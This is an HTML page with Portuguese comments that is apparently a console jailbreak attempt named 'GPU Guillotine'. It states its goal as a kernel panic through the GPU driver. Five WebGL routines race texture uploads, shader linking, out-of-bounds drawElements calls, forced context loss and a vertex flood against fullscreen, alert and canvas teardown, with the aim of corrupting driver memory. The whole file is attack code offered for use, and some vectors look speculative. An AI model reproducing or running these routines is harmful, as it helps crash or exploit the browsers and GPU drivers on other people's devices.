<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v260000: GPU Guillotine</title>
<style>
    body { background: #000; color: #0ff; font-family: monospace; text-align: center; padding: 10px; }
    h1 { color: #0ff; border-bottom: 2px solid #0ff; }
    .status { border: 1px solid #0ff; padding: 10px; margin-bottom: 20px; color: #fff; }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #003; color: #0ff; border: 2px solid #0ff;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #0ff; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #333; margin-top: 20px; }
</style>
</head>
<body>

<h1>v260000: GPU GUILLOTINE</h1>

<div class="status">
    OBJETIVO: KERNEL PANIC VIA DRIVER GPU<br>
    CLIQUE -> FULLSCREEN (QUADRADO) -> FECHE ALERTA
</div>

<button onclick="guillotine(gpu01)">01. Texture Upload Race (VRAM Corruption)</button>
<button onclick="gpu_guillotine(gpu02)">02. Shader Compile & Link Race</button>
<button onclick="gpu_guillotine(gpu03)">03. Index Buffer Overflow (DrawElements)</button>
<button onclick="gpu_guillotine(gpu04)">04. Context Loss Extension Abuse</button>
<button onclick="gpu_guillotine(gpu05)">05. The "Infinite" Geometry (Vertex Flood)</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');

    function gpu_guillotine(vectorFunc) {
        // Usa a mesma função wrapper para manter compatibilidade com botão 1
        guillotine(vectorFunc);
    }

    function guillotine(vectorFunc) {
        Stage.innerHTML = "";
        
        // 1. Configura WebGL
        const target = document.createElement('canvas');
        target.width = 500; target.height = 500;
        target.style.background = "red";
        Stage.appendChild(target);
        
        // Inicia o contexto WebGL
        const gl = target.getContext('webgl') || target.getContext('experimental-webgl');
        
        if(!gl) {
            alert("WebGL não suportado!");
            return;
        }

        // Configura o vetor específico
        const payload = vectorFunc(gl, target);

        // 2. Solicita Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. O Timing da Guilhotina
        requestAnimationFrame(() => {
            setTimeout(() => {
                // Inicia o stress da GPU
                if(payload.stress) payload.stress();

                window.alert("⚠️ GPU LOCKED ⚠️\n\nAo fechar, o comando gráfico ficará órfão.");

                // Detonação
                if(payload.detonate) {
                    payload.detonate();
                }
                
                // Spray de Memória Gráfica (Conceitual)
                // Removemos o canvas do DOM para forçar o driver a limpar recursos
                target.remove();
            }, 50);
        });
    }

    // =================================================================
    // 01. Texture Upload Race
    // Tenta enviar texturas para a GPU enquanto o contexto morre.
    // =================================================================
    function gpu01(gl, canvas) {
        const texture = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, texture);
        
        // Aloca textura 2k x 2k
        const size = 2048;
        const pixels = new Uint8Array(size * size * 4).fill(255);
        
        return {
            stress: () => {
                // Envia dados para GPU
                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
            },
            detonate: () => {
                // Tenta modificar a textura enquanto o canvas é destruído
                // Isso cria uma condição de corrida no driver de memória de vídeo
                gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, size, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
                
                // Perda de contexto forçada (se extensão existir)
                const ext = gl.getExtension('WEBGL_lose_context');
                if(ext) ext.loseContext();
            }
        };
    }

    // =================================================================
    // 02. Shader Compile & Link Race
    // Compila shaders complexos durante o crash.
    // =================================================================
    function gpu02(gl, canvas) {
        const vsSource = `attribute vec4 p; void main() { gl_Position = p; }`;
        const fsSource = `precision mediump float; void main() { gl_FragColor = vec4(1,0,0,1); }`;
        
        return {
            stress: () => {
                // Criação de recursos
                const vs = gl.createShader(gl.VERTEX_SHADER);
                gl.shaderSource(vs, vsSource);
                gl.compileShader(vs);
                
                const fs = gl.createShader(gl.FRAGMENT_SHADER);
                gl.shaderSource(fs, fsSource);
                gl.compileShader(fs);
            },
            detonate: () => {
                // Tenta linkar o programa num contexto morto
                const prog = gl.createProgram();
                // Não anexa os shaders (estado inválido) e tenta linkar
                gl.linkProgram(prog);
                gl.useProgram(prog);
            }
        };
    }

    // =================================================================
    // 03. Index Buffer Overflow (DrawElements)
    // Manda a GPU desenhar índices que não existem no buffer.
    // =================================================================
    function gpu03(gl, canvas) {
        const buf = gl.createBuffer();
        gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, buf);
        // Buffer pequeno
        gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, new Uint16Array([0, 1, 2]), gl.STATIC_DRAW);
        
        return {
            stress: () => {
                gl.clearColor(0, 0, 1, 1);
                gl.clear(gl.COLOR_BUFFER_BIT);
            },
            detonate: () => {
                // Pede para desenhar 1 milhão de elementos
                // O buffer só tem 3. O driver deve checar limites.
                // Se falhar durante o crash -> Kernel Panic (Acesso inválido de memória GPU)
                gl.drawElements(gl.TRIANGLES, 1000000, gl.UNSIGNED_SHORT, 0);
            }
        };
    }

    // =================================================================
    // 04. Context Loss Extension Abuse
    // Usa a extensão de depuração para simular perda de contexto
    // concorrentemente com a destruição real.
    // =================================================================
    function gpu04(gl, canvas) {
        const ext = gl.getExtension('WEBGL_lose_context');
        
        return {
            stress: () => {
                // Desenha algo
                gl.clear(gl.COLOR_BUFFER_BIT);
            },
            detonate: () => {
                if(ext) {
                    // Confusão: Perde, restaura, perde de novo
                    ext.loseContext();
                    try { ext.restoreContext(); } catch(e){}
                    ext.loseContext();
                }
                // Tenta chamar comando em contexto perdido
                gl.finish();
            }
        };
    }

    // =================================================================
    // 05. The "Infinite" Geometry (Vertex Flood)
    // Tenta alocar um buffer de vértices gigante e desenhá-lo.
    // =================================================================
    function gpu05(gl, canvas) {
        const buf = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
        
        // Tenta criar um array buffer gigante (pode falhar, mas o intento é estressar)
        let hugeData;
        try {
            hugeData = new Float32Array(1024 * 1024 * 5); // 20MB de geometria
        } catch(e) { return {}; }

        return {
            stress: () => {
                gl.bufferData(gl.ARRAY_BUFFER, hugeData, gl.DYNAMIC_DRAW);
            },
            detonate: () => {
                // Desenha arrays enquanto o buffer é deletado
                gl.drawArrays(gl.POINTS, 0, 1000000);
                gl.deleteBuffer(buf);
            }
        };
    }

</script>
</body>
</html>
